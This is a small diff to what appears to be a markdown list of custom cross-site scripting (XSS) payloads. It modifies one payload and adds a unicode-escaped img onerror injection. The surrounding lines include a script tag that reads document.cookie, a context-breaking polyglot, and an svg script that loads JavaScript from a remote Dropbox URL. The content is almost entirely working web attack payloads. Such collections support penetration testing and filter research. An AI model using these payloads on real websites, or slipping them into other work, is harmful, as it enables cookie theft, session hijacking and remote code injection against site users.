@@ -1,6 +1,7 @@
 # Custom XSS Payloads
 ```javascript
-<img src=1111111><img src=1111111><a href="javascript:alert(document.domain)">axxx</a><svg></svg><img src=1>
+<img src=123><img src=123><a href="javascript:alert(document.domain)">xss</a><svg></svg><img src=1>
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
 <script /***/>/***/confirm(document.cookie,document.domain)/***/</script /***/
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
